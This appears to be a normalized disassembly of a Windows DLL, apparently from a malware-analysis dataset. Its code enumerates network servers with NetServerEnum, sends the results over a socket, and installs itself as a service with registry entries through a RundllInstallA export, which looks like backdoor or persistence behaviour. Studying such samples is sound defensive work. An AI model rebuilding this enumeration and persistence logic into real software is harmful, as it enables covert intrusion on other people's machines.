[ edi ] [ esi ]
mov ecx [ eax ]
lea edx [ esp + 0x50 ]
push 0x104
push edx
push eax
call [ ecx + 0xc ]
cmp [ esp + esi + 0x48 ] al
je r-xdata
sub_71007010
sub esp 0x20
push ebx
push ebp
push esi
mov esi [ malloc@IAT ]
push edi
xor eax eax
push 0x64
mov [ esp + 0x24 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x20 ] eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x2c ] eax
call esi
mov ebx eax
push 0x64
mov [ esp + 0x34 ] ebx
call esi
push 0x64
mov [ esp + 0x20 ] eax
call esi
mov ebp eax
mov ecx 0x19
xor eax eax
mov edi ebx
[ edi ]
mov edi [ esp + 0x20 ]
mov ecx 0x19
[ edi ]
mov edx [ esp + 0x40 ]
mov ecx 0x19
mov edi ebp
[ edi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add edx 0x6
push ecx
push edx
push ebp
call [ strncpy@IAT ]
mov edi ebp
or ecx 0xffffffff
xor eax eax
add esp 0x18
xor esi esi
[ edi ]
not ecx
dec ecx
je r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
lea edx [ esi + 0x1 ]
[ edi ]
not ecx
dec ecx
cmp edx ecx
jae r-xdata
mov ecx [ esp + 0x14 ]
mov edx ebp
sub ecx ebp
mov [ esp + 0x34 ] ecx
jmp r-xdata
mov eax [ esp + 0x14 ]
mov edx rw-data
mov cx [ eax ]
cmp cx [ edx ]
jne r-xdata
mov cl [ edx + ebp ]
mov eax edx
sub eax esi
mov edi ebp
inc edx
mov [ eax + ebx - 0x1 ] cl
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp edx ecx
jb r-xdata
mov al [ edx ]
cmp al 0x2d
je r-xdata
mov ecx 0x3
mov edi rw-data
mov esi eax
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov [ esp + 0x10 ] 0x18
mov [ ecx + edx ] al
inc esi
mov edi ebp
or ecx 0xffffffff
xor eax eax
inc edx
[ edi ]
not ecx
dec ecx
cmp esi ecx
jb r-xdata
mov edx [ eax ]
mov ecx rw-data
cmp edx [ ecx ]
jne r-xdata
mov [ esp + 0x10 ] 0x4
mov ecx [ esp + 0x34 ]
mov esi eax
mov ecx 0x3
mov edi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ esp + 0x10 ] 0x2000000
push rw-data
push ebx
call [ fopen@IAT ]
mov edx [ esp + 0x18 ]
add esp 0x8
lea ecx [ esp + 0x28 ]
mov esi eax
push ecx
push 0x0
lea eax [ esp + 0x2c ]
push edx
lea ecx [ esp + 0x24 ]
push eax
push ecx
lea edx [ esp + 0x34 ]
push 0xffffffff
push edx
push 0x65
push 0x0
call NetServerEnum
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
mov [ esp + 0x10 ] 0x2
mov ecx [ esp + 0x20 ]
test ecx ecx
je r-xdata
cmp eax 0xea
je r-xdata
push esi
call [ fclose@IAT ]
mov esi [ free@IAT ]
push ebx
call esi
mov edx [ esp + 0x1c ]
push edx
call esi
push ebp
call esi
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov ecx 0x800
mov edi rw-data
[ edi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push rw-data
call sub_71001f60
mov ecx [ rw-data ]
add esp 0x1c
mov [ rw-data ] eax
push 0x0
push eax
push rw-data
push ecx
call send
push 0x0
call [ ExitThread@IAT ]
mov edx [ esp + 0x18 ]
mov ebx [ fprintf@IAT ]
test edx edx
mov [ esp + 0x34 ] 0x0
jbe r-xdata
push eax
push rw-data
push esi
call [ fprintf@IAT ]
add esp 0xc
jmp r-xdata
cmp eax 0xea
jne r-xdata
lea edi [ ecx + 0x10 ]
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
push ecx
push rw-data
push esi
call ebx
mov ebx [ esp + 0x38 ]
add esp 0xc
push rw-data
push esi
call ebx
mov eax [ esp + 0x2c ]
add esp 0x8
push eax
push rw-data
push esi
call ebx
add esp 0xc
push rw-data
push esi
call [ fwprintf@IAT ]
add esp 0x8
push rw-data
push esi
call ebx
mov ecx [ edi - 0xc ]
add esp 0x8
push ecx
push rw-data
push esi
call [ fwprintf@IAT ]
mov edx [ edi - 0x4 ]
mov eax [ edi - 0x8 ]
mov ecx [ edi - 0x10 ]
add esp 0xc
push edx
push eax
push ecx
push rw-data
push esi
call ebx
add esp 0x14
push rw-data
push esi
call ebx
mov al [ edi ]
add esp 0x8
test al 0x8
je r-xdata
push eax
call NetApiBufferFree
test [ edi ] 0x10
je r-xdata
push rw-data
push esi
call ebx
add esp 0x8
test [ edi ] 0x4
je r-xdata
push rw-data
push esi
call ebx
add esp 0x8
test [ edi ] 0x2000000
je r-xdata
push rw-data
push esi
call ebx
add esp 0x8
test [ edi ] 0x80
je r-xdata
push rw-data
push esi
call ebx
add esp 0x8
mov eax [ edi ]
test ah 0x40
je r-xdata
push rw-data
push esi
call ebx
add esp 0x8
mov eax [ edi ]
test ah 0x2
je r-xdata
push rw-data
push esi
call ebx
add esp 0x8
mov edx [ edi + 0x4 ]
push edx
push rw-data
push esi
call [ fwprintf@IAT ]
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
add esp 0xc
add edi 0x18
inc eax
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x34 ]
inc eax
cmp eax ecx
mov [ esp + 0x34 ] eax
jb r-xdata
push rw-data
push esi
call ebx
add esp 0x8
lea eax [ edi - 0x10 ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
sub_71007550
sub esp 0x10c
push ebx
push ebp
mov ebp [ esp + 0x120 ]
push esi
test ebp ebp
push edi
mov esi ebp
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x14 ] 0x7a120
jle r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x10c
retn
mov edi [ esp + 0x120 ]
mov ebx [ esp + 0x124 ]
test esi esi
jg r-xdata
push 0x0
push esi
push ebx
push edi
call send
test eax eax
je r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
push eax
push 0x0
push ecx
push 0x0
push 0x0
mov [ esp + 0x30 ] edi
mov [ esp + 0x2c ] 0x1
call select
lea edx [ esp + 0x18 ]
push edx
push edi
call __WSAFDIsSet
test eax eax
je r-xdata
mov eax ebp
pop edi
sub eax esi
pop esi
pop ebp
pop ebx
add esp 0x10c
retn
add ebx eax
sub esi eax
InstallService
push ebp
mov ebp esp
push 0xffffffff
push sub_71007fa0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x240
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
mov edi rw-data
cmp eax ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] 0x80000002
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x1c ] edi
je r-xdata
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push ebx
push rw-data
push ecx
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x30 ]
lea ecx [ ebp - 0x24c ]
push eax
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x54 ]
push ecx
push edx
push ebx
push rw-data
push eax
mov [ ebp - 0x30 ] 0x1f4
call [ RegQueryValueExA@IAT ]
mov ecx [ ebp - 0x14 ]
mov esi eax
push ecx
mov [ ebp + 0x8 ] esi
call [ RegCloseKey@IAT ]
push esi
call [ SetLastError@IAT ]
cmp esi ebx
je r-xdata
push eax
push rw-data
push rw-data
call sub_71007b90
add esp 0xc
lea edx [ ebp - 0x50 ]
mov [ ebp - 0x50 ] rw-data
push r--data
push edx
call _CxxThrowException
mov [ ebp - 0x1c ] eax
mov edi eax
mov ebx [ strchr@IAT ]
lea esi [ ebp - 0x24c ]
lea edx [ ebp - 0x48 ]
push r--data
push edx
mov [ ebp - 0x48 ] rw-data
call _CxxThrowException
push rw-data
call sub_71007b90
add esp 0x4
lea esi [ ebp - 0x24c ]
push edi
push esi
call [ _stricmp@IAT ]
add esp 0x8
test eax eax
je r-xdata
lea eax [ ebp - 0x38 ]
push r--data
push eax
mov [ ebp - 0x38 ] rw-data
call _CxxThrowException
push esi
push rw-data
call sub_71007b90
add esp 0x8
push 0x0
push esi
call ebx
add esp 0x8
inc eax
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push 0x0
push esi
call ebx
add esp 0x8
inc eax
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov esi eax
test esi esi
mov [ ebp - 0x24 ] esi
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
push 0x1
push 0x2
push 0x110
push 0xf01ff
push rw-data
push edi
push esi
call [ CreateServiceA@IAT ]
mov ebx eax
test ebx ebx
mov [ ebp - 0x20 ] ebx
jne r-xdata
lea ecx [ ebp - 0x28 ]
push r--data
push ecx
mov [ ebp - 0x28 ] rw-data
call _CxxThrowException
push edi
push rw-data
call sub_71007b90
add esp 0x8
push ebx
mov ebx [ CloseServiceHandle@IAT ]
call ebx
push esi
call ebx
push 0x1f4
lea eax [ ebp - 0x24c ]
push rw-data
push eax
mov [ ebp - 0x14 ] 0x80000002
call [ strncpy@IAT ]
push 0x64
lea ecx [ ebp - 0x24c ]
push edi
push ecx
call [ strncat@IAT ]
mov ecx [ ebp - 0x14 ]
add esp 0x18
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x24c ]
push edx
push 0xf003f
push 0x0
push eax
push ecx
call [ RegOpenKeyExA@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
call [ GetLastError@IAT ]
push eax
push edi
push rw-data
mov [ ebp + 0x8 ] eax
call sub_71007b90
add esp 0xc
lea edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] rw-data
push r--data
push edx
call _CxxThrowException
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0x24c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
mov edx [ ebp - 0x14 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ ebp - 0x24c ]
or ecx 0xffffffff
[ edi ]
not ecx
mov esi [ RegSetValueExA@IAT ]
push ecx
lea ecx [ ebp - 0x24c ]
push ecx
push 0x1
push eax
push rw-data
push edx
call esi
mov edi eax
push edi
mov [ ebp + 0x8 ] edi
call [ SetLastError@IAT ]
test edi edi
je r-xdata
push eax
push edi
push rw-data
call sub_71007b90
add esp 0xc
lea edx [ ebp - 0x4c ]
mov [ ebp - 0x4c ] rw-data
push r--data
push edx
call _CxxThrowException
mov edx [ ebp - 0x14 ]
lea ecx [ ebp - 0x18 ]
push ecx
push rw-data
push edx
call [ RegCreateKeyA@IAT ]
mov edi eax
push edi
mov [ ebp + 0x8 ] edi
call [ SetLastError@IAT ]
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push r--data
push eax
mov [ ebp - 0x2c ] rw-data
call _CxxThrowException
mov edx [ rw-data ]
lea ecx [ ebp - 0x24c ]
push 0x1f4
push ecx
push edx
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] rw-data
call _CxxThrowException
lea edi [ ebp - 0x24c ]
or ecx 0xffffffff
xor eax eax
mov edx [ ebp - 0x18 ]
[ edi ]
not ecx
push ecx
lea ecx [ ebp - 0x24c ]
push ecx
push 0x2
push eax
push rw-data
push edx
call esi
mov esi eax
push esi
mov [ ebp + 0x8 ] esi
call [ SetLastError@IAT ]
test esi esi
je r-xdata
lea eax [ ebp - 0x3c ]
push r--data
push eax
mov [ ebp - 0x3c ] rw-data
call _CxxThrowException
mov ecx [ ebp - 0x1c ]
push ecx
push rw-data
call sub_71007b90
add esp 0x8
jmp r-xdata
lea eax [ ebp - 0x44 ]
push r--data
push eax
mov [ ebp - 0x44 ] rw-data
call _CxxThrowException
mov edx [ ebp - 0x14 ]
mov edi [ RegCloseKey@IAT ]
push edx
call edi
mov eax [ ebp - 0x18 ]
push eax
call edi
mov ecx [ ebp - 0x20 ]
push ecx
call ebx
mov edx [ ebp - 0x24 ]
push edx
call ebx
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_710079b4
mov esi [ ebp - 0x58 ]
test esi esi
je r-xdata
mov eax r-xdata
retn
cmp [ esi ] 0x0
je r-xdata
call [ GetLastError@IAT ]
push eax
push esi
push rw-data
mov [ ebp + 0x8 ] eax
call sub_71007b90
add esp 0xc
UninstallService
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] esi
push 0xf003f
push esi
push esi
call [ OpenSCManagerA@IAT ]
mov ebx eax
mov [ ebp - 0x24 ] ebx
cmp ebx esi
jne r-xdata
mov edi rw-data
mov [ ebp - 0x28 ] edi
mov eax [ ebp + 0x8 ]
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov [ ebp - 0x1c ] esi
push esi
push rw-data
call sub_71007b90
add esp 0x8
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x10000
push edi
push ebx
call [ OpenServiceA@IAT ]
mov esi eax
mov [ ebp - 0x20 ] esi
test esi esi
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov [ ebp - 0x1c ] esi
push esi
push edi
push rw-data
call sub_71007b90
add esp 0xc
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
call [ DeleteService@IAT ]
test eax eax
jne r-xdata
mov edi eax
mov [ ebp - 0x28 ] edi
push edi
push rw-data
call sub_71007b90
add esp 0x8
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push ebx
call esi
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_71007b90
mov ecx [ esp + 0x4 ]
sub esp 0x42c
lea eax [ esp + 0x434 ]
lea edx [ esp + 0x2c ]
push esi
push eax
push ecx
push 0x400
push edx
call [ _vsnprintf@IAT ]
add esp 0x10
push 0xfffffff5
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
push rw-data
push rw-data
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push edi
lea eax [ esp + 0x8 ]
push 0x0
push eax
lea edi [ esp + 0x3c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi [ WriteFile@IAT ]
dec ecx
push ecx
lea ecx [ esp + 0x40 ]
push ecx
push esi
call edi
lea edx [ esp + 0x8 ]
push 0x0
push edx
push 0x2
push rw-data
push esi
call edi
pop edi
jmp r-xdata
lea ecx [ esp + 0x30 ]
push ecx
call [ OutputDebugStringA@IAT ]
pop esi
add esp 0x42c
retn
lea eax [ esp + 0x30 ]
lea ecx [ esp + 0x8 ]
push eax
push ecx
call [ _strtime@IAT ]
add esp 0x4
lea edx [ esp + 0x20 ]
push eax
push edx
call [ _strdate@IAT ]
add esp 0x4
push eax
push rw-data
push esi
call [ fprintf@IAT ]
mov eax [ _iob@IAT ]
add esp 0x14
add eax 0x40
test eax eax
jne r-xdata
push esi
call [ fclose@IAT ]
add esp 0x4
sub_71007c80
sub esp 0x8
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x4 ] ecx
lea ecx [ esp + 0x4 ]
push edx
mov edx [ esp + 0x10 ]
push ecx
push eax
push edx
mov [ esp + 0x10 ] eax
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
mov [ esp ] eax
jne r-xdata
mov edx [ esp + 0x4 ]
add esp 0x8
retn
call [ GetLastError@IAT ]
test eax eax
je r-xdata
mov eax [ esp ]
or eax 0xffffffff
or edx 0xffffffff
add esp 0x8
retn
sub_71007cf0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_71007d9e
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_71007d9e
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_710023d0
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_71007d9e
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_71007d9e
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_71001ee0
call ??0Init@ios_base@std@@QAE@XZ
jmp sub_71001f00
??0Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::Init@IAT ]
sub_71001f00
push ??1Init@ios_base@std@@QAE@XZ
call sub_71007d5e
pop ecx
retn
??1Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::~Init@IAT ]
sub_71001f20
call ??0_Winit@std@@QAE@XZ
jmp sub_71001f40
??0_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::_Winit@IAT ]
sub_71001f40
push ??1_Winit@std@@QAE@XZ
call sub_71007d5e
pop ecx
retn
??1_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::~_Winit@IAT ]
sub_710023d0
mov eax [ esp + 0x8 ]
dec eax
jne r-xdata
mov eax 0x1
retn 0xc
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
RundllInstallA
mov eax [ esp + 0xc ]
push eax
call InstallService
pop ecx
retn 0x10
sub_71007b2c
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx ]
mov [ ebp - 0x2c ] edx
mov eax 0x1
retn
RundllUninstallA
mov eax [ esp + 0xc ]
push eax
call UninstallService
pop ecx
retn 0x10
GetSystemPowerStatus
jmp [ GetSystemPowerStatus@IAT ]
ReadDirectoryChangesW
jmp [ ReadDirectoryChangesW@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
sub_71007d32
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_71007d5e
push [ esp + 0x4 ]
call sub_71007d32
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
_ftol
jmp [ _ftol@IAT ]
sub_71007d76
push esi
mov esi ecx
call ??1type_info@@UAE@XZ
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
_initterm
jmp [ _initterm@IAT ]
send
jmp [ send@IAT ]
recv
jmp [ recv@IAT ]
__WSAFDIsSet
jmp [ __WSAFDIsSet@IAT ]
select
jmp [ select@IAT ]
closesocket
jmp [ closesocket@IAT ]
shutdown
jmp [ shutdown@IAT ]
gethostname
jmp [ gethostname@IAT ]
connect
jmp [ connect@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
htons
jmp [ htons@IAT ]
socket
jmp [ socket@IAT ]
inet_ntoa
jmp [ inet_ntoa@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
NetApiBufferFree
jmp [ NetApiBufferFree@IAT ]
NetServerEnum
jmp [ NetServerEnum@IAT ]
sub_71007f60
mov eax r--data
jmp __CxxFrameHandler
sub_71007f70
lea ecx [ ebp - 0x46f4 ]
call sub_71001800
retn
sub_71007f7c
lea ecx [ ebp - 0x4700 ]
call sub_71001800
retn
sub_71007f88
mov eax r--data
jmp __CxxFrameHandler
sub_71007fa0
mov eax r--data
jmp __CxxFrameHandler
